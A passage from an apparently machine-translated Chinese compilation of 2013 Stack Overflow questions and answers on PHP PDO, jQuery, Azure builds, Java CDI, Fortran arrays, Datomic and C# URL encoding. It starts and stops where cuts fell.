 <p><span id="paragraph1"> <span id="sentence1">This is a sentence, with stuff.</span><span id="sentence2">  Mr. John doe was walking down the street. </span><span id="sent3"> Mrs. Daisy knows how to drive but does not drive. </span> <span id="sent4"> The car is fast, but is an ugly color.</span>  <span id="sent4"> This is an example of a paragraph.</span> </span> </P>

</br>

<div><span id="paragraph2"> <span id="sent5">However, sometimes, paragraphs on HTML pages are not tagged as with a consistent format.</span><span id="sent6">  This makes it hard to identify paragraphs and sentences.</span> <span id="sent7"> I need a solution to tag them with CSS id's</span></span></div> 
```

1) 可以使用什么解决方案来识别 HTML 中的段落并标记它们。

2) OpenNLP 非常适合识别句子，但我没有看到 html 剥离器。

我在想我可以使用 Tika 剥离 HTML 并将其输入 OpenNLP 以识别句子，但是我丢失了所有格式并且不知道将标签放回原始 HTML 的位置。

# select - 即使我已经定义并绑定了该参数，PDO 错误“参数未定义”

> ID：14111958
> 
> 赞同：1
> 
> 时间：2013-01-01T16:10:12.033
> 
> 标签：select, parameters, pdo, bind

我正在尝试将此登录脚本从 mySql 转换为 PDO，并且 SELECT 语句适用于 user_name 但不适用于密码。

显示的错误消息是`"SQLSTATE[HY093]: Invalid parameter number: parameter was not defined`“。我需要为此语句以不同方式绑定 $hashedPassword 吗？

```
<?php
session_start(); 
//Include database connection details & salt
$password = $_POST['password'];  
$hashedPassword = sha1($salt . $password); 

try {  
   $stmt_user = $conn->prepare("SELECT * FROM customer_info WHERE user_name = :user_name and password = :hashedPassword");      

   $stmt_user->bindValue(':user_name', $_POST['user_name'], PDO::PARAM_STR); 
   $stmt_user->bindValue(':password', $hashedPassword);     
   $stmt_user->execute();                 
   session_regenerate_id();                       
   $member = $stmt_user->fetch();
   $_SESSION['SESS_USER_ID'] = $member['user_id'];                    
   session_write_close();
   header("location: launch_member_account.php");
   exit();
}catch(PDOException $e) {
 echo $e->getMessage();
}    
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:37:10.010

该语句定义了一个名为 的参数`:hashedPassword`，但该`bindValue()`调用使用了一个名为 的未知参数`:password`。

```
$stmt_user = $conn->prepare("SELECT * FROM customer_info WHERE user_name = :user_name and password = :hashedPassword");      
//---------------------------------------------------------------------------------------------------^^^^^^^^^^^^^^^^^
// Change this to match the statement.
$stmt_user->bindValue(':hashedPassword', $hashedPassword); 
```

参数的名称无关紧要，只要它们匹配，因此最好让它们在您的应用程序中保持一致。

# javascript - 返回主屏幕的按钮不起作用

> ID：14111959
> 
> 赞同：0
> 
> 时间：2013-01-01T16:10:33.500
> 
> 标签：javascript, jquery

我遇到的这个问题有点难以解释，但我简化并使其尽可能简单。

声明：
如下图所示，有9个div对点击很敏感，当你点击其中任何一个时，会出现另一个屏幕，这在下面的第二张图中也很明显。![div 图像](../Images/904677ac692d1ec67ae46ef82e62ec0e.png)

问题：在第一个 DIV 中，当我单击返回主菜单时，一切正常，但是，当我单击第二个 DIV 并单击返回主菜单时，按钮不起作用。我对两者都使用了相同的 backtoMain() 方法，但显然有问题。

![第二张图片](../Images/e8f0a2fe099ccfb48b23b3b10e171349.png)

我用来使 backToMainMenu 按钮工作的 javascript 代码：

```
 function hideAllDivs () { /* the function that hides all divs */

              jQuery('#thirdVision').hide();
              jQuery('#forthVision').hide();
              jQuery('#fifthVision').hide();
              jQuery('#sixthVision').hide();
              jQuery('#seventhVision').hide();
              jQuery('#eightthVision').hide();
              jQuery('#ninethVision').hide();
              jQuery('#tenthVision').hide();
              jQuery('#eleventhVision').hide();
              //jQuery('#secondVision').show();
            }
            function returnToMenu () { /* the function that shows main screen which is secondVision */
              hideAllDivs();
              jQuery('#secondVision').show(1400); /* shows secondVision "First Picture" in 1 and a half second */
            }
            jQuery('#backToMain').click(function(e){ /* the function responsible for when "backtoMainMenu" button is clicked */
                returnToMenu();
                e.preventDefault();
            }); 
```

我已经研究了大约 3 天，但不知道如何解决它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:27:47.047

@Nima 您对多个后退按钮使用相同的 id，而不是在 ID 的情况下使用 class

html链接应该是

```
<a href="#" class="button big green backToMain"><span> Back To </span>Main Menu</a> 
```

并且脚本代码应该是

```
jQuery('.backToMain').click(function(e){ 
       returnToMenu();
       e.preventDefault();
}); 
```

希望这会有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:30:50.443

使用类而不是 ID，例如：

***[jsbin 演示](http://jsbin.com/emicim/3/edit)***

使用方法获取`index()`被点击元素的获取相关内容`.eq()`

HTML：示例

```
<div id="container">

  <div class="box">Title 1</div>
  <div class="box">Title 2</div>
  <div class="box">Title 3</div>
  ...

  <div class="content">Content 1</div>
  <div class="content">Content 2</div>
  <div class="content">Content 3</div>
  ...

  <button id="backToMain">BACK TO MAIN</button>

</div> 
```

问：

```
(function( $ ){

  $('.box').click(function(){        
    var myIndex = $(this).index();
    $('.content').eq( myIndex ).show();
    $('#backToMain').show();
  });

  $('#backToMain').click(function(e){ 
      $(this).hide();
      $('.content').hide();
  });

})(jQuery); 
```

# shell - 从程序执行的控制台命令如何创建图形对话框来响应输入提示？

> ID：14111961
> 
> 赞同：0
> 
> 时间：2013-01-01T16:10:52.227
> 
> 标签：shell, command-line, prompt, freepascal, lazarus

正在执行命令的 Lazarus/FPC 程序如何`TProcess`检测输入提示并为输入创建图形对话框？

例如，假设我执行了一个需要输入密码的`ssh`命令- 它如何检测到它，用图形对话框提示它并传递它以使命令继续？`TProcess`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-19T20:08:09.620

好吧，您至少有两个选择：

1.  对于“文本图形”（例如：文本框）使用whiptail或对话框并捕获它们的输出，它将包含用户输入的纯文本密码，例如对话框：`dialog --passwordbox "Please enter password:" 10 40`
2.  对于 X-Window 图形屏幕，您可以使用 zenity 并获取输出，它将包含纯文本密码，例如：`zenity --password --title "Security question: "`

# android - 持久 Http 连接 Android

> ID：14111964
> 
> 赞同：0
> 
> 时间：2013-01-01T16:11:11.633
> 
> 标签：android, http, https, android-networking

我想在我的 android 应用程序中建立一个持久的 http 连接。由于后端响应配置为**Keep-Alive**。

我想知道如何在 Android 中建立持久的 http 连接以避免每次握手请求。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-01T16:17:46.223

设置标头以包含保持活动的请求。

```
HttpURLConnection conn = (HttpURLConnection) mURL.openConnection();
conn.setRequestProperty("Connection","Keep-Alive"); 
```

# azure - TargetProfile 给出 No default service configuration 错误

> ID：14111965
> 
> 赞同：9
> 
> 时间：2013-01-01T16:11:11.633
> 
> 标签：azure, msbuild, tfsbuild, azure-cloud-services

我正在 TFS 2012 构建定义中构建 Azure 云服务应用程序。**一切都在默认的云**配置下正常工作。但是，当我`TargetProfile`在参数中设置属性时，`MSBuild`出现以下错误。服务配置文件存在于项目中，我可以在项目属性中进行选择。

我需要做些什么来让构建识别非默认配置吗？

### MSBuild 参数

> /t:发布 /p:PublishDir=\buildserver\builddrops\LocA\ /p:TargetProfile=CloudLocA

### 错误信息

> C:\Program Files (x86)\MSBuild\Microsoft\VisualStudio\v11.0\Windows Azure Tools\1.8\Microsoft.WindowsAzure.targets (353)：项目中找不到默认服务配置“ServiceConfiguration.cscfg”。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-02T03:19:29.337

我想通了，它最终与`TargetProfile`财产无关。我将构建定义设置为仅清理工作区输出。当我查看构建服务器上的源文件夹时，我意识到它没有拉下额外的服务配置文件，因此它找不到我在`TargetProfile`属性中指定的内容。我将干净的工作区设置更改为全部，现在一切正常。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-01T16:45:59.340

您是否尝试将其绑定`TargetProfile`到`$(Configuration)`? 在我的上一个项目中，我使用以下设置配置了 Azure 项目，它运行良好：

```
 ...
 <PropertyGroup>
  <TargetProfile Condition="'$(TargetProfile)'==''">$(Configuration)</TargetProfile>
 </PropertyGroup>
 <!-- Items for the project -->
 <ItemGroup>
  <ServiceDefinition Include="ServiceDefinition.csdef">
   <SubType>Designer</SubType>
  </ServiceDefinition>
  <None Include="ServiceDefinition.Debug.csdef">
   <SubType>Designer</SubType>
    <DependentUpon>ServiceDefinition.csdef</DependentUpon>
  </None>
  <None Include="ServiceDefinition.Demo.csdef">
   <SubType>Designer</SubType>
   <DependentUpon>ServiceDefinition.csdef</DependentUpon>
  </None>
  <None Include="ServiceDefinition.Release.csdef">
    <SubType>Designer</SubType>
    <DependentUpon>ServiceDefinition.csdef</DependentUpon>
  </None>
  <ServiceConfiguration Include="ServiceConfiguration.Debug.cscfg">
   <SubType>Designer</SubType>
  </ServiceConfiguration>
  <ServiceConfiguration Include="ServiceConfiguration.Demo.cscfg">
   <SubType>Designer</SubType>
  </ServiceConfiguration>
  <ServiceConfiguration Include="ServiceConfiguration.Release.cscfg">
   <SubType>Designer</SubType>
  </ServiceConfiguration>
 </ItemGroup> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-08-30T06:35:37.193

最好的办法是在你的项目的 ccproj 中更改服务配置前缀，添加 yourprojectname.configurationname 点是救命稻草。

```
<ServiceConfigurationPrefix>yourproject.ServiceConfiguration</ServiceConfigurationPrefix> 
```

在项目组中添加这些：

```
<ServiceDefinition Include="yourproject.ServiceDefinition.csdef" />
<ServiceConfiguration Include="yourproject.ServiceConfiguration.cscfg" /> 
```

确保您已从其所在文件夹重命名您的 cscfg 文件。

重新加载

# jquery - 更改类的 id

> ID：14111966
> 
> 赞同：0
> 
> 时间：2013-01-01T16:11:12.007
> 
> 标签：jquery

我在页面中有一个垂直和水平居中的 div。但是当这个 div id 大于屏幕不能居中并被切割。所以我试图检测div是否大于文档更改为margin 0 auto。但我不知道该怎么做。是否可以删除 id 属性并将其赋予类“onTop”属性？

我在这里玩：http: [//jsfiddle.net/c9unU/](http://jsfiddle.net/c9unU/)

jQuery：

```
$(function(){      
    var documentHeight = $(document).height();
    var contenttHeight = $("#content").height();

    if(documentHeight < contenttHeight ){
        /* give it the class onTop */
    }else{
        /* give it the id content */
    }   
}) 
```

HTML：

```
<div id="background">
    <div id="content"> some text inside</div>
</div> 
```

CSS：

```
body {margin: 0;padding: 0;color:#fff; font-size:40px;}

#background {
    position: absolute;
    width:100%;
    height:100%;
    border: 0px;
    background-color:blue;
}

.onTop {
    position: relative;
    top: 0; 
    left: 0;
    margin: 0 auto;
    background-color:green;
    width:300px;
    height:600px;
    border:0px;
  }

#content {
    position:absolute;
    top:50%;
    left:50%;
    margin-top:-300px;
    margin-left:-150px;
    background-color: red;
    width:300px;
    height:600px;
    border:0px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:23:25.730

您正在接近这种情况，就好像您只能选择使用 ID CSS**或**class CSS 规则。将两者结合起来非常简单：

```
#content {
   /* properties here*/
}

/* CSS for #content when class onTop is added to it*/
#content.onTop {
    position: relative;
    top: 0; 
    left: 0;
    margin: 0 auto;
    background-color:green;
    width:300px;
    height:600px;
    border:0px;
  } 
```

JS

```
$(function(){      
    var documentHeight = $(document).height();
    var contenttHeight = $("#content").height();
     $('#content').toggleClass('onTop', documentHeight < contenttHeight)

}) 
```

第二个参数`toggleClass()`是一个布尔值，表示添加或删除类

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:18:14.277

尝试这个：

```
$(function(){      
    var documentHeight = $(document).height();
    var contenttHeight = $("#content").height();

    if(documentHeight < contenttHeight ){
        $('#content').removeAttr('id').addClass('onTop');
    }else{
        $('.onTop').removeClass().attr('id', 'content');
    }   
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T16:24:27.850

简单：默认给出Id，添加和删除类。确保类 css**在**默认 css 之后。保持简单。

CSS：

```
#content.onTop {
    position: relative;
    top: 0; 
    left: 0;
    margin: 0 auto;
    background-color:green;
    width:300px;
    height:600px;
    border:0px;
  } 
```

查询：

```
if(documentHeight < contenttHeight ){
        /* give it the class onTop */$('#content').addClass('onTop');
    }else{
        /* remove class ontop */
    } 
```

您实际上不需要删除类，因为它首先不会存在。但是，如果您在窗口调整大小时调整屏幕会更好。

# javascript - 当 tabBarPosition 为 'top' 时，在 tabbar 上显示图标，

> ID：14111967
> 
> 赞同：1
> 
> 时间：2013-01-01T16:11:20.073
> 
> 标签：javascript, mobile, extjs, sencha-touch-2

以下代码**显示每个选项卡标题的图标**。

```
Ext.define("MyAPP.view.Main", {
    extend : 'Ext.tab.Panel',
    config : {
        tabBarPosition : 'bottom', // <--- Line of interest
        items : [{
            title: "Contacts",
            iconCls: "team",
        }]
    }
}); 
```

请参见下面的示例。

![图标显示在底部](../Images/af0dfec1a8f58f0c0f9d8a6692532472.png)

但是，如果我将其更改`tabBarPosition: 'top'`为看不到任何图标。整个风格变了。

![顶部没有显示图标](../Images/32a111d6181801d824038b27c2aa8967.png)

标签栏位置位于顶部时如何显示图标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T17:31:05.220

你用的是哪个版本的ST？它在 2.1.0 上完美运行。

![顶部停靠的标签栏](../Images/bdd513f35edba4d4b56ba0d5330b5159.png)

编辑：请确保您至少使用 Sencha Touch 2.1.0-b1，因为从该版本中引入了顶部停靠的工具栏图标，您可以在发行说明中阅读：

> [TOUCH-2] 顶部停靠的标签栏现在可以有图标

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-09T18:36:30.450

以防万一这对任何人都有帮助...我不知道为什么，但是有时，当升级到 2.1 或更早版本时，图标不会自动显示在停靠在顶部的选项卡栏上（这可能是因为我正在使用 linux ）。在这种情况下，您必须执行以下操作：

*   选择要添加图标的标签栏元素（当我说标签栏中的元素时，我当然是指标签面板中的元素，我知道标签栏是标签面板中的另一个元素，与其他元素不同） .
*   转到配置面板。
*   手动添加属性“iconCls”，因为你找不到它。
*   然后将该属性设置为字符串，最后将其值设置为“home”、“info”或您想要的任何图标。

当然，这一切都在使用 Architect。从技术上讲，我不是程序员，所以如果我的写作在任何意义上都不好，请原谅我。

# jsf - 在 JSF 命名 bean 中注入 Java 对象

> ID：14111972
> 
> 赞同：3
> 
> 时间：2013-01-01T16:11:51.987
> 
> 标签：jsf, jakarta-ee, dependency-injection, java-ee-6, cdi

我有一个 JSF2 bean 用作我的视图的控制器：

```
@Named
@SessionScoped
public class PosController implements Serializable {

  @EJB FatturaFacade fatturaFacade;

  // ...
} 
```

如您所见，我已经可以在其中注入我的一个 EJB（用作 dao 包装器），但是注入“简单”对象的方法是什么？如果我有如下不同的实现呢？

```
interface Retriever;
class WebServiceRetriever implements Retriever;
class FileRetriever implements Retriever; 
```

看了`@interface`注释，没看懂。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T17:12:14.413

假设您拥有完整的 Java EE 6 平台，最好的方法是使用 CDI 的`@Inject`.

最简单的机制是使用具体类型：

```
public class Bean {
  @Inject
  private WebServiceRetriever webServiceRetriever;

  @Inject
  private FilesRetriever filesRetriever;

  //etc. 
```

对于同一接口的多个实现，您可以创建[@Qualifier](http://docs.oracle.com/javaee/6/api/javax/inject/Qualifier.html)注释。[Java EE 6 教程的使用限定符部分](http://docs.oracle.com/javaee/6/tutorial/doc/gjbck.html)解释了它们的用法。

`@Files`限定符：

```
@Qualifier
@Retention(RUNTIME)
@Target({TYPE, METHOD, FIELD, PARAMETER})
public @interface Files {} 
```

`FileRetriever`实施：

```
@Files
public class FileRetriever implements Retriever {} 
```

`Retriever`注入目标中实现的消歧：

```
public class Bean {
  @Inject @WebServices
  private Retriever webServiceRetriever;

  @Inject @Files
  private Retriever filesRetriever;

  //etc. 
```

我的博客上有一篇关于[将 JSF 与 CDI 结合使用](http://illegalargumentexception.blogspot.co.uk/2012/07/jsf-cdi-and-el.html)的文章，您可能会发现它很有用。

# php - PHP for 循环返回单个值

> ID：14111975
> 
> 赞同：1
> 
> 时间：2013-01-01T16:12:13.820
> 
> 标签：php, loops, for-loop, return-value

我想让 for 循环返回单个值（TRUE/FALSE）。但是代码返回多个值。喜欢真真真。我理解代码，但没有任何想法去做。

```
public function user_activation_check(){
    for($i=1;$i<5;$i++){
        $query = $this->db->query("SELECT group_info.member".$i." FROM `group_info` INNER JOIN `user_student` ON group_info.member$i=user_student.email WHERE user_student.email=group_info.member$i");
        if($query->num_rows()==1){
            //return TRUE;
            echo"true";
        }else {
            //return FALSE;
            echo"false";
        }
    }
} 
```

请帮忙。

更新：

```
public function member_activation(){
    if($this->model_users->user_activation_check()){
        $this->load->view('v_confirm_group');
    }else echo "Some members didn't activate their account.";
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T16:18:10.593

使用与以下相同的数组：

```
 $res = array():
for($i=1;$i<5;$i++){
    $query = $this->db->query("SELECT group_........");
    if($query->num_rows()==1){
        $res[] = TRUE;
    }else {
        $res[] =  FALSE;
    }
}
return $res; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:59:24.220

我认为这就是你想要的：

```
public function user_activation_check(){
   for($i=1;$i<5;$i++){
        $query = $this->db->query("SELECT group_info.member".$i." FROM `group_info` INNER JOIN `user_student` ON group_info.member$i=user_student.email WHERE user_student.email=group_info.member$i");
        if($query->num_rows()==1){
            // do nothing
        }else {
            echo "false"; // *atleast* one member didn't.
            return FALSE;
        }
    }
    echo "true";
    return TRUE;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T16:51:20.550

它回显了多个值，因为您正在运行一个循环。它将回显五个值，每个循环执行一个值。如果您只希望它回显一次，请使用`return`. 一个函数可以回显多次，但它只能返回一个值。当它返回真或假时，它结束函数的执行。

# php - MySQL 数据库结构用于存储哪些文件以及用户下载了多少次？

> ID：14111980
> 
> 赞同：0
> 
> 时间：2013-01-01T16:13:19.767
> 
> 标签：php, mysql, database, structure

我正在创建一个数据库，该数据库将存储用户下载媒体文件的次数，以及用户下载的媒体文件（基于 IP，无需登录）。我只是不确定 MySQL 数据库的正确结构。

我已经有一个包含所有媒体文件的数据库，因此计数不会成为问题，但我也希望能够查看谁下载了文件。我将使用 PHP 来检索内容，但我不确定如何最有效地获取它。就像这样：*“XYZ.mp3 有 20 次下载。[IMN CMS]*点击*XYZ.mp3 已被 1.2.3.4 下载了四次，其他 IP 下载了 16 次”*

另外，我希望能够看到 1.2.3.4 已经听了 XYZ.mp3 四次，HWM.mp3 听了一次，等等。

此外，我最终想知道他们听了多少 mp3 文件。（我的网站上有一个内置播放器）我也希望它可以看到很多人根据文件听了这么多，或者这个用户已经听了这么多这个文件。

如前所述，我知道如何计算多少次，但我不确定如何最有效地构建第二部分，以便可以快速收集数据。

此外，文件数量每周线性增长，最终会变成一个非常大的数字，所以我不确定是否有 200 列（现在）根据需要扩展是要走的路吗？我不希望有庞大的用户群，但你永远不知道。我不想在以后重组和重新编码，因为它确实如此。

感谢您的帮助，如果您有任何问题，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:21:59.693

如果是我，我会有 3 张桌子：

1.  **连接**- 使用一些唯一的连接 ID 保留 IP 和会话 ID。
2.  **下载**- 保留文件 ID 和连接 ID。这可以让您知道文件已下载多少次以及通过哪个连接。
3.  **播放**- 保留文件 ID、连接 ID 和文件 dl %。用于`http partial content`跟踪给定连接 ID 已播放每个文件的多少。

在这三个之间，您可以根据您的要求建立统计数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T17:11:31.313

如果我是你，我会做以下事情：

**1.**我会给每个文件一个id号，mysql可以自动递增。

**2.**然后我将创建另一个表，其中存储用户下载的文件的 ip 和 id。

希望这可以帮助。

# arrays - 如何在 Fortran 中定义变化的维度对象？

> ID：14111986
> 
> 赞同：0
> 
> 时间：2013-01-01T16:14:43.557
> 
> 标签：arrays, fortran

我想定义一个块数组，每个块将包含一个不同大小的节点数组。所以我写了一个如下的程序，但它不起作用。我想知道我怎么能在 FORTRAN 中做到这一点？还有其他更好的方法吗？基本的困难是使它们可分配！

```
program Mesh
    implicit none
    integer::i

    type node
      double precision::x,y
    end type node

    type block
        integer::NX,NY
        integer::ENB,WNB,SNB,NNB      
        integer::BlockType            
        type(node),dimension(:,:),allocatable::nodes
    end type block

    type(block),dimension(:),allocatable::blocks !Error:Syntax Error in Data Declaration

    allocate(blocks(1:9)) ! here using 9 just to simplify it,error: allocate-object is not               a nonprocedure pointer or allocatable object

    do i=1,sizeof(blocks)
        blocks(i)%NX=i*2  !Here I want to read in some value, but just use i*2 to simplify
        blocks(i)%NY=i*2  !Here I want to read in some value, but just use i*2 to simplify
        allocate(blocks(i)%nodes(0:NX,0:NY)) !error: not allocatable object either
    end do

end program 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T17:30:48.833

正如高性能标记所指出的，修复编译器建议的语法将处理大多数其他错误消息。您的编译器可能会出错的另一个地方是这一行：

```
allocate(blocks(i)%nodes(0:NX,0:NY)) 
```

where`NX`和`NY`在块之外不知道`type`。请将此行更改为：

```
allocate(blocks(i)%nodes(0:blocks(i)%NX,0:blocks(i)%NY)) 
```

另外，我相信您打算使用：

```
do i=1,size(blocks) 
```

代替：

```
do i=1,sizeof(blocks) 
```

`sizeof`是一个以字节为单位返回对象大小的非标准函数。`size`是一个标准内在函数，它返回数组中元素的数量。在这种情况下使用`sizeof`可能会导致循环后期出现分段错误或未定义的行为。

# asp.net-mvc - 使用数据注释发生错误时需要更改标签的类

> ID：14111991
> 
> 赞同：0
> 
> 时间：2013-01-01T16:15:42.573
> 
> 标签：asp.net-mvc

我正在使用带有数据注释的 MVC 4，一切正常，但我的应用程序需要在出现错误时将标签设置为红色。例如，如果有一个表单域

名字后跟一个文本框。假设文本框上有一个必填字段验证。现在，当用户不输入数据时，验证会完美触发，但是我想在发生错误时将保存 Firstname 的 span 标签的类更改为不同的类。有没有办法做到这一点。

要添加，我需要将错误消息显示为摘要的一部分，并且在我的情况下，标签名称在错误时应该是红色的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:25:07.613

无需定义任何 C# 代码。相反，MVC 验证消息包含它们自己的类名`field-validation-error`，因此在其中定义新的自定义样式。

**例子 ：**

```
.field-validation-error {
    color:#F00;
    font-weight:bold;
} 
```

希望这会有所帮助！

# java - Java 中的 Datomic 内存查询不返回任何结果

> ID：14111993
> 
> 赞同：-1
> 
> 时间：2013-01-01T16:16:23.803
> 
> 标签：java, clojure, datomic

在 Clojure 谷歌支持小组上发布这个似乎对我不起作用，所以我会尝试在这里提问。

我正在运行以下稍作修改的 GettingStarted.java（来自 clojure 发行版）作为 Spring 配置的测试，以查看 Datomic 如何集成到我的应用程序中，并且在下面的第一个 Peer.q 调用中没有得到任何结果（而相同的控制台调用返回 150 条记录）。我在这里做错了什么，请帮忙？

```
@ContextConfiguration(classes={GettingStartedConfig.class}, loader=AnnotationConfigContextLoader.class)
@RunWith(SpringJUnit4ClassRunner.class)
public class GettingStartedTest {

    private final Logger log = LoggerFactory.getLogger(getClass());
    private static final Scanner scanner = new Scanner(System.in);

    private String uri = "datomic:mem://seattle";

    @Autowired
    private Reader schema;

    @Autowired
    private Reader seed0;

    private  void pause() {
        if (System.getProperty("NOPAUSE") == null) {
            log.info("\nPress enter to continue...");
            scanner.nextLine();
        }
    }

    @SuppressWarnings("rawtypes")
    @Test
    public void test() throws Exception {

        log.info("Creating and connecting to database...at {}", uri +"\n\n");

        Peer.createDatabase(uri);
        Connection conn = Peer.connect(uri);

        pause();

        log.info("Parsing schema dtm file and running transaction...\n\n");

        log.info("schema: "+schema);

        List schema_tx = (List) Util.readAll(schema).get(0);
        schema.close();
        Object txResult = conn.transact(schema_tx).get();
        log.info("result of schema transaction: "+txResult);

        pause();

        log.info("Parsing seed data dtm file and running transaction...\n\n");

        List data_tx = (List) Util.readAll(seed0).get(0);
        seed0.close();
        txResult = conn.transact(data_tx).get();

        pause();

        log.info("Finding all communities, counting results...\n\n");

        Collection results = Peer.q("[:find ?c :where [?c :community/name]]", conn.db());
        log.info("size of the result = {} " , results.size() + "\n\n");

        pause(); 
```

...................................

> [main] INFO com.excelsiorsoft.daedalus.persistence.datomic.GettingStartedTest - 查找所有社区，计算结果...
> 
> [main] INFO com.excelsiorsoft.daedalus.persistence.datomic.GettingStartedTest - 结果大小 = 0

提前感谢您帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T04:59:39.203

我不能为你调试你的代码。

但我怀疑您实际上并没有首先填充数据库。这可能与 Spring 配置有关，或者与您用于读取数据的任何代码有关。

我建议尝试一个更简单的测试，您可以直接插入一两个事实，并在尝试更复杂的事情之前测试您是否可以阅读它们。

# objective-c - 在 NSUserAutomatorTask 中设置变量

> ID：14111994
> 
> 赞同：5
> 
> 时间：2013-01-01T16:16:26.733
> 
> 标签：objective-c, macos, automator

我正在将一些代码从 AMWorkflow 迁移到 NSUserAutomatorTask，以便最终我可以沙箱化我的应用程序。我希望能够在工作流中设置现有变量的值，就像在 AMWorkflow 中一样：

```
AMWorkflow *task = [[AMWorkflow alloc] initWithContentsOfURL:scriptURL error:nil];
[task setValue:@"myValue" forVariableWithName:@"myVar"]; 
```

但是，我似乎无法使用 NSUserAutomatorTask 获得类似的东西。我能找到的唯一文档（类参考）说将变量作为 NSDictionary 提供。

所以我正在尝试类似的东西：

```
NSUserAutomatorTask * task = [[NSUserAutomatorTask alloc] initWithURL:workflow error:nil];

task.variables = [NSDictionary dictionaryWithObject:@"myValue" forKey:@"myVar"];
[task executeWithInput:nil completionHandler:^(id result, NSError *error){
    if(error)
        NSLog(@"Error while executing workflow %@", [error localizedDescription]);
}]; 
```

我在另一个答案（[将 AMWorkflow 与沙盒应用程序一起使用](https://stackoverflow.com/questions/12149529)）中读到，NSUserAutomatorTask 的“executeWithInput:”提供的值被忽略。变量是否也有可能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-17T21:45:55.343

当您第一次在 10.8.3 中发布但无法使其正常工作时，我确实尝试过。我尝试了各种没有运气的事情。

我现在使用的是 10.8.4，它现在似乎可以在没有对您的基本代码进行任何实际更改的情况下工作。

```
NSUserAutomatorTask * task = [[NSUserAutomatorTask alloc] initWithURL:[NSURL  URLWithString:@"file:///Users/UserName/Desktop/folderActionTest/test.workflow"] error:nil];

NSDictionary* taskDict = [NSDictionary dictionaryWithObject:@"Test item" forKey:@"Storage"];
task.variables=taskDict;
[task executeWithInput:nil completionHandler:^(id result, NSError *error){
    if(error)
        NSLog(@"Error while executing workflow %@", [error localizedDescription]);
}]; 
```

该工作流是一个简单的工作流，它已经有一个名为**Storage**的变量和一个从变量中获取其输入的选择列表。

![在此处输入图像描述](../Images/a0d0e3dd6ce0bdee4ce049b5c261a59c.png)

运行代码时的工作流。

![在此处输入图像描述](../Images/61d9082658721c42496c9e47ad87376c.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T15:54:33.557

这可能会有所帮助 - 尚未尝试但正在寻找相同的答案

[https://developer.apple.com/library/mac/#documentation/AppleApplications/Reference/AMWorkflow_class/Reference/Reference.html#//apple_ref/occ/cl/AMWorkflow](https://developer.apple.com/library/mac/#documentation/AppleApplications/Reference/AMWorkflow_class/Reference/Reference.html#//apple_ref/occ/cl/AMWorkflow)

setValue:forVariableWithName：使用指定名称设置工作流变量的值。

```
- (BOOL)setValue:(id)value forVariableWithName:(NSString *)variableName 
```

参数 value 要为命名变量设置的值。

variableName 要为其设置值的变量的名称。

返回值 YES，如果找到 variableName 并且设置了它的值；否则否。

讨论 如果未找到由 variableName 指定的变量，此方法不执行任何操作。

可用性 在 OS X v10.5 及更高版本中可用。在 AMWorkflow.h 中声明 valueForVariableWithName：返回具有指定名称的工作流变量的值。

```
- (id)valueForVariableWithName:(NSString *)variableName 
```

参数 variableName 变量名。

返回值 变量的值。如果没有找到具有指定名称的变量，则返回 nil。

可用性 在 OS X v10.5 及更高版本中可用。另请参阅 – setValue:forVariableWithName: 在 AMWorkflow.h 中声明 writeToURL:error

# c# - c#发送带有特殊字符的requst会干扰字符串

> ID：14111997
> 
> 赞同：4
> 
> 时间：2013-01-01T16:16:38.997
> 
> 标签：c#, .net, httpwebrequest, request

我从解决方案中的一个项目向另一个项目发送请求：

```
WebRequest request = WebRequest.Create(UrlTemplate);
request.Timeout = 500000;
request.Method = WebRequestMethods.Http.Post;
request.ContentType = ContentType;
byte[] postData = System.Text.Encoding.ASCII.GetBytes(data);
request.ContentLength = postData.Length;
Stream newStream = request.GetRequestStream();
// Send the data.
newStream.Write(postData, 0, postData.Length);
newStream.Flush();
newStream.Close(); 
```

好吧，在我设置的函数中，`UrlTemplate`我得到了正确的字符串（我在数据中发送），但是当字符串包含特殊字符时问题就开始了。

如果字符串是：`12&34`

我在函数中得到的是：`12`.

如果字符串是：`12+34`

我在函数中得到的是：`12 34`.

我很高兴知道你们中的一些人是否发生过这种情况以及你们是如何解决的。预先感谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T16:18:37.520

在形成 UrlTemplate 时使用`System.Web.HttpUtility.UrlEncode`或`System.Net.WebUtility.UrlEncode`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:20:07.460

该问题是由于字符串是[url-form Encoded](https://stackoverflow.com/questions/5899297/url-encoding-form-encoding-and-mailto-encoding)引起的。（如果这只是一个 GET，我会说它是 URL 编码的，但您使用的是 POST。） & 符号在 URL 中具有特殊含义，而 + 符号用作空格的替换。

有关规范，请参见[http://www.w3.org/TR/html401/interact/forms.html#h-17.13.3.3](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.3.3)。如果您想获得您期望的结果，您需要使用[UrlEncode()手动对这些进行编码。](http://msdn.microsoft.com/en-us/library/zttxte6w.aspx)

* * *

## 回答 #3

